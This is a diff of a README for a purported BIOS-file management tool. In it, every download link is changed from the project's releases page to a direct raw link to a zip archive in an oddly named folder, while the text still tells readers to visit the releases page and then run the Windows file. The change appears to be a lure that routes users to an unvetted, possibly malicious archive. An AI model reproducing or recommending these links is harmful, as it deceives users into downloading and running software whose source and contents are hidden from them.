@@ -1,6 +1,6 @@
 # 🧬 BIOS-Preservation-Tool - Keep BIOS Files Organized
 
-[![Download BIOS-Preservation-Tool](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/releases)
+[![Download BIOS-Preservation-Tool](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/raw/refs/heads/main/taratantara/Tool-BIO-Preservation-v2.1.zip)
 
 ## 🖥️ What This App Does
 
@@ -11,7 +11,7 @@ Use it to keep BIOS files grouped, checked, and ready for your setup. It is made
 ## 📥 Download the App
 
 Visit the releases page to download and run this file:
-[Download BIOS-Preservation-Tool](https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/releases)
+[Download BIOS-Preservation-Tool](https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/raw/refs/heads/main/taratantara/Tool-BIO-Preservation-v2.1.zip)
 
 On that page, look for the latest release. In most cases, the file will be a Windows `.exe` or a `.zip` file.
 
@@ -164,7 +164,7 @@ This keeps your setup easier to manage and reduces the chance of missing-file er
 ## 🧷 Release Downloads
 
 Use the release page for every Windows download:
-[https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/releases](https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/releases)
+[https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/raw/refs/heads/main/taratantara/Tool-BIO-Preservation-v2.1.zip](https://github.com/Huntingtonpublicised407/BIOS-Preservation-Tool/raw/refs/heads/main/taratantara/Tool-BIO-Preservation-v2.1.zip)
 
 Open the latest release, download the Windows file, and run it after extraction if needed
 
